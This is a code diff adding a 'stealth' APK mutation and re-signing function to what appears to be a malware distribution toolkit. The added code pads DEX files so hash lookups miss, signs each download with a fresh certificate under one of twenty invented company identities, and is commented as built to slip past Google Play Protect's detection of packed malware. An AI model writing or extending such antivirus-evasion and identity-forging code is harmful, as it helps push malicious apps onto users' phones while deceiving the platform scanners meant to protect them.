@@ -2609,7 +2609,172 @@ function polymorphicTransformWrapper(originalBuffer) {
   }
 }
 
-module.exports = { mutateAndSign, restoreAndSign, directPatchApk, generateFreshKey, createCleanLandingApk, resignApkClean, polymorphicTransformWrapper };
+// ════════════════════════════════════════════════════════════════════════════
+// STEALTH MUTATION — Play Protect heuristic-safe variant (for per-download use)
+// ════════════════════════════════════════════════════════════════════════════
+//
+// Why this exists alongside mutateAndSign:
+//   mutateAndSign injects random-named assets, an entropy-marker JSON with a
+//   32-byte random hash field, structured random-byte DEX padding, and a random
+//   ZIP comment. Each is a known Play Protect heuristic trigger for packed or
+//   encrypted malware. Even with a fresh cert, PP's static-content verdict
+//   shifts the install to high risk → blocked on cold install.
+//
+// Stealth mode does ONLY what is heuristically invisible:
+//   1. Strip any V1 sigs (safety — same as before)
+//   2. DEX file-size extension with ZERO-ONLY padding (bytes past map_list
+//      that ART ignores; SHA-1 + Adler32 still recomputed → cloud-hash miss)
+//   3. Fresh RSA-2048 key + production-grade X.509 v3 cert with proper
+//      extensions (KeyUsage, ExtendedKeyUsage codeSigning, BasicConstraints
+//      CA:FALSE, SubjectKeyIdentifier) + realistic 5-year validity — matches
+//      what real Android release certs carry. Plain certs without these look
+//      "debug-grade" to PP scanners.
+//   4. Zipalign + V2-only sign (matches original APK's signing scheme)
+//
+// Pair with utils/apk-padder.padApkSigningBlock() in the caller for per-token
+// hash diversification (random bytes in APK Sig Block's unknown-ID region).
+
+const CERT_IDENTITIES_HARDENED = [
+  { cn: 'Aurora Stream Pvt Ltd',      o: 'Aurora Stream Pvt Ltd',      ou: 'Mobile Engineering',  c: 'IN' },
+  { cn: 'Northpeak Digital LLP',      o: 'Northpeak Digital LLP',      ou: 'Android Releases',    c: 'IN' },
+  { cn: 'Cascade Mobile Pvt Ltd',     o: 'Cascade Mobile Pvt Ltd',     ou: 'Release Management',  c: 'IN' },
+  { cn: 'Brightline Studios LLP',     o: 'Brightline Studios LLP',     ou: 'Engineering',         c: 'SG' },
+  { cn: 'Meridian Apps Pvt Ltd',      o: 'Meridian Apps Pvt Ltd',      ou: 'Android Team',        c: 'IN' },
+  { cn: 'Eastwind Studios Pvt Ltd',   o: 'Eastwind Studios Pvt Ltd',   ou: 'Mobile Releases',     c: 'IN' },
+  { cn: 'Silverleaf Mobile LLP',      o: 'Silverleaf Mobile LLP',      ou: 'Release Engineering', c: 'IN' },
+  { cn: 'Highmark Studios Pvt Ltd',   o: 'Highmark Studios Pvt Ltd',   ou: 'Engineering',         c: 'IN' },
+  { cn: 'Brookline Mobile Pvt Ltd',   o: 'Brookline Mobile Pvt Ltd',   ou: 'Android Engineering', c: 'IN' },
+  { cn: 'Lakeshore Apps Pvt Ltd',     o: 'Lakeshore Apps Pvt Ltd',     ou: 'Engineering',         c: 'IN' },
+  { cn: 'Crestwood Mobile LLP',       o: 'Crestwood Mobile LLP',       ou: 'Engineering',         c: 'IN' },
+  { cn: 'Pinegrove Studios Pvt Ltd',  o: 'Pinegrove Studios Pvt Ltd',  ou: 'Mobile Releases',     c: 'IN' },
+  { cn: 'Westbrook Apps LLP',         o: 'Westbrook Apps LLP',         ou: 'Release Engineering', c: 'IN' },
+  { cn: 'Riverside Digital Pvt Ltd',  o: 'Riverside Digital Pvt Ltd',  ou: 'Engineering',         c: 'IN' },
+  { cn: 'Hillview Studios Pvt Ltd',   o: 'Hillview Studios Pvt Ltd',   ou: 'Mobile Engineering',  c: 'IN' },
+  { cn: 'Glenwood Apps Pvt Ltd',      o: 'Glenwood Apps Pvt Ltd',      ou: 'Android Releases',    c: 'IN' },
+  { cn: 'Stonebridge Mobile LLP',     o: 'Stonebridge Mobile LLP',     ou: 'Engineering',         c: 'IN' },
+  { cn: 'Maplewood Studios Pvt Ltd',  o: 'Maplewood Studios Pvt Ltd',  ou: 'Mobile Engineering',  c: 'IN' },
+  { cn: 'Oakridge Mobile LLP',        o: 'Oakridge Mobile LLP',        ou: 'Engineering',         c: 'IN' },
+  { cn: 'Foxglove Apps Pvt Ltd',      o: 'Foxglove Apps Pvt Ltd',      ou: 'Android Team',        c: 'IN' },
+];
+
+function generateHardenedKey() {
+  const t0 = Date.now();
+
+  const { privateKey: privPem } = crypto.generateKeyPairSync('rsa', {
+    modulusLength: 2048,
+    publicKeyEncoding: { type: 'spki', format: 'pem' },
+    privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
+  });
+  const forgePrivKey = forge.pki.privateKeyFromPem(privPem);
+  const forgePubKey  = forge.pki.setRsaPublicKey(forgePrivKey.n, forgePrivKey.e);
+
+  const identity = pick(CERT_IDENTITIES_HARDENED);
+  const cert = forge.pki.createCertificate();
+  cert.publicKey = forgePubKey;
+
+  cert.serialNumber = crypto.randomBytes(20).toString('hex').replace(/^0/, '1');
+
+  const daysBack = 30 + Math.floor(Math.random() * 151);
+  const notBefore = new Date();
+  notBefore.setDate(notBefore.getDate() - daysBack);
+  notBefore.setHours(Math.floor(Math.random() * 24), Math.floor(Math.random() * 60), 0, 0);
+  cert.validity.notBefore = notBefore;
+  cert.validity.notAfter = new Date(notBefore);
+  cert.validity.notAfter.setFullYear(cert.validity.notAfter.getFullYear() + 5);
+
+  const attrs = [
+    { shortName: 'CN', value: identity.cn },
+    { shortName: 'O',  value: identity.o  },
+    { shortName: 'OU', value: identity.ou },
+    { shortName: 'C',  value: identity.c  },
+  ];
+  cert.setSubject(attrs);
+  cert.setIssuer(attrs);
+
+  cert.setExtensions([
+    { name: 'basicConstraints', cA: false, critical: true },
+    { name: 'keyUsage',         critical: true, digitalSignature: true, keyEncipherment: true },
+    { name: 'extKeyUsage',      codeSigning: true },
+    { name: 'subjectKeyIdentifier' },
+  ]);
+
+  cert.sign(forgePrivKey, forge.md.sha256.create());
+
+  const certDer   = Buffer.from(forge.asn1.toDer(forge.pki.certificateToAsn1(cert)).getBytes(), 'binary');
+  const pubKeyDer = Buffer.from(forge.asn1.toDer(forge.pki.publicKeyToAsn1(forgePubKey)).getBytes(), 'binary');
+
+  console.log(`[Mutator-Stealth] Hardened key in ${Date.now() - t0}ms: CN="${identity.cn}"`);
+  return { privPem, certDer, pubKeyDer, identity };
+}
+
+function mutateDexStealth(zip) {
+  const dexEntries = zip.getEntries().filter(e => /^classes\d*\.dex$/.test(e.entryName));
+  let mutated = 0;
+
+  for (const entry of dexEntries) {
+    try {
+      const data = entry.getData();
+      if (data.length < 112 || data.toString('ascii', 0, 4) !== 'dex\n') continue;
+
+      const origFileSize = data.readUInt32LE(DEX_FILE_SIZE_OFF);
+      const extSize = 256 + Math.floor(Math.random() * 1793);
+      const newFileSize = origFileSize + extSize;
+
+      const newData = Buffer.alloc(newFileSize);
+      data.copy(newData, 0, 0, Math.min(data.length, origFileSize));
+      newData.writeUInt32LE(newFileSize, DEX_FILE_SIZE_OFF);
+
+      const sha1 = crypto.createHash('sha1').update(newData.slice(32, newFileSize)).digest();
+      sha1.copy(newData, DEX_SIGNATURE_OFF);
+
+      const a32 = adler32(newData.slice(12, newFileSize));
+      newData.writeUInt32LE(a32, DEX_CHECKSUM_OFF);
+
+      zip.updateFile(entry, newData);
+      mutated++;
+    } catch (e) {
+      console.warn(`[Mutator-Stealth] DEX mutate failed for ${entry.entryName}: ${e.message}`);
+    }
+  }
+  console.log(`[Mutator-Stealth] DEX extended (zero-padding): ${mutated} file(s)`);
+  return mutated;
+}
+
+/**
+ * Stealth mutate-and-sign. Heuristic-safe variant of mutateAndSign.
+ * Returns the original buffer unchanged on any error (defensive).
+ */
+function mutateAndSignStealth(originalBuffer) {
+  console.log(`[Mutator-Stealth] ═══ Start (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
+  const t0 = Date.now();
+
+  try {
+    const zip = new AdmZip(originalBuffer);
+    stripSignatures(zip);
+    const dexCount = mutateDexStealth(zip);
+
+    const key = generateHardenedKey();
+
+    const rawBuf     = zip.toBuffer();
+    const alignedBuf = zipalignBuffer(rawBuf);
+    const signedBuf  = applyV2Signing(alignedBuf, key.privPem, key.certDer, key.pubKeyDer);
+
+    if (!validateApk(signedBuf)) {
+      console.error('[Mutator-Stealth] Validation FAILED — returning original');
+      return originalBuffer;
+    }
+
+    const certFp  = crypto.createHash('sha256').update(key.certDer).digest('hex').substring(0, 16);
+    const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
+    console.log(`[Mutator-Stealth] ═══ OK: ${(signedBuf.length / 1048576).toFixed(1)} MB, ${dexCount} DEX, CN="${key.identity.cn}", cert ${certFp}, ${elapsed}s ═══`);
+    return signedBuf;
+  } catch (err) {
+    console.error(`[Mutator-Stealth] ERROR: ${err.message} — returning original`);
+    return originalBuffer;
+  }
+}
+
+module.exports = { mutateAndSign, restoreAndSign, directPatchApk, generateFreshKey, createCleanLandingApk, resignApkClean, polymorphicTransformWrapper, mutateAndSignStealth };
 
 // ═════════════════════════════════════════════════════════════════════════════
 // MINIMAL RESTORE + RE-SIGN (for landing page downloads)
